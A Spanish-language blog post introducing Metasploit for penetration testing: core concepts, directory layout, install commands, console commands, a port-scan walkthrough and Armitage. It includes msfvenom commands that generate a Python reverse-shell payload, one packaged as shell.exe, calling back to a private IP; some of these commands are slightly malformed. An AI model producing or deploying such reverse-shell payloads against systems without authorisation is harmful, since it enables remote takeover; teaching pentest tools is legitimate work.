---
layout: post
author: Conde
---

## Índice
- [Definición](#definción)
- [Conceptos](#conceptos)
- [Uso de metasploit](#uso)
  - [Instalación](#instalación)
  - [Parámetros](#parametros)
  - [Msfvenom](#msfvenom)
  - [Ejemplo de uso](#ejemplo)
  - [Armitage](#armitage)
    - [Instalación](#instalación)

### Definición
Metasploit es un proyecto de **código abierto** para la seguridad informática, que proporciona información acerca de vulnerabilidades de seguridad
y ayuda en **Pentesting**. Para usar esta herramienta no necesitas tener conocimientos de lo que hace, ya que te lo dan **todo automatizado**, de 
forma que solo hay que hacer unos pequeños ajustes. En mi opinión no me gust utilizarlo, pero un hacker, debe saber utilizar todas las herramientas 
posibles, por si algún día le es necesario. 

### Conceptos 
Antes de utilizarlo, es importante tener unos conceptos claros, estos son: 
- **Payload** ➜ Un payload es la parte del código del malware que realiza la acción maliciosa en el sistema.
- **Exploit** ➜ Es cualquier ataque que aprovecha las vulnerabilidades de las aplicaciones, las redes, los sistemas operativos o el hardware.
- **Handler** ➜ Handler es un listener (Similiar a netcat).
- **Meterpreter** ➜ Este concepto sale mucho en metasploit, este es un tipo de payload que te otorga un shell super potente.

Dentro de metasploit hay una serie de directorios importantes que son: 
- **El directorio principal (En Kali, Parrot)** 
  - */usr/share/metasploit-framework* 
- **El directorio principal (En Arch)** 
  - */opt/metasploit*

Dentro del podemos encontrar un directorio muy importante 
- **/opt/metasploit/modules** ➜ Aqui se encuentra los payloads.
- **/opt/metasploit/modules/payloads** ➜ Aqui dentro tenemos tres directorios super importantes.

Los tres directorios importantes son: 
- **/opt/metasploit/modules/payloads/singles** ➜ Estes son payloads autocontenidos, esto quiere decir que hace lo que indica (Crea usuarios, shell, etc).
- **/opt/metasploit/modules/payloads/stagers** ➜ Este tipo de payload necesita un stages para funcionar (Estos establecen la conexión).
- **/opt/metasploit/modules/payloads/stages** ➜ Este se deposita cuando el stagers realizan la conexión, y este realiza acciones más avanzadas, el más conocido es meterpreter. 

### Uso 
#### Instalación 
Para instalar metasploit solo es necesario ejecutar el siguiente comando: 

En debian y derivadas
```bash
apt-get install metasploit -y 
```
En arch y derivadas 
```bash
pacman -S metasploit --noconfirm
```

Una vez instalado para lanzarlo usamos: 
```bash
msfconsole
```

#### Parametros
En esta ocasión no parametros, sino las funcionalidades que incluye dentro para usar, algunas son: 
- **connect** ➜ Nos permite conectarnos a un puerto que este a la escucha 
- **search** ➜ Nos permite buscar exploit del servicio indicado 
- **use** ➜ Usamos el exploit indicado que obtuvimos haciendo el search 
- **back** ➜ Nos permite salir del exploit 
- **sessions** ➜ Vemos las sesiones actualies
- **show options** ➜ Vemos las opciones básicas del exploit 
- **show advanced** ➜ Vemos las opciones avanzadas del exploit 
- **set** ➜ Nos permite modificar el valor de las variables que usa 
- **show payloads** ➜ Nos permite ver los payloads que utiliza ese exploit 
- **set payload** ➜ Indicamos el payload a usar 
- **exploit** ➜ Lanzamos el ataque 
- **info** ➜ Muestra información sobre el exploit, payload, etc

#### Msfvenom 
Msfvenom, es una herramienta que nos permite crear payloads personalizados. Este forma parte de Metasploit, pero se puede usar como un 
comando cualquiera y por defecto es instalado junto a metasploit. Veamos algún ejemplo: 
- **-p** ➜ indicamos el payload 
- **lhost y lport** ➜ Variables que vamos a configurar 
- **-f** ➜ Tipo de extensión 
- **-o** ➜ Almacenar en fichero 

Generar un payload para otorgar una shell con python
```bash
msfvenom -p /python/shell_reverse_tcp lhost=192.168.20.123 lport 888  
```
Generar un payload para otorgar una shell con python para windows
```bash
msfvenom -p /python/shell_reverse_tcp lhost=192.168.20.123 lport 888 -f exe -o shell.exe
```

#### Ejemplo
Ahora veremos un ejemplo de uso de metasploit, para realizar un escaneo de puertos. 
1. Comezamos lanzando metasploit 
```bash
msfconsole
```
2. Buscamos el exploit relacionado 
```bash
search portscan 
```
3. Usamos el exploit que escogamos 
```bash
use /auxiliary/scanner/portscan/tcp 
```
4. Vemos las opciones del exploit 
```bash
show options 
```
5. Configuramos las variables necesarios (Yes)
```bash
set rhosts 192.168.20.123 
```
6. Lo lanzamos 
```bash
exploit 
```

#### Armitage 
Armitage, es una inferfaz gráfica para utilizar metasploit de una forma más fácil. 

##### Instalación
En debian y derivadas. 

```bash
apt-get install armitage -y 
```
En arch y derivadas 

```bash
pacman -S armitage --noconfirm 
```
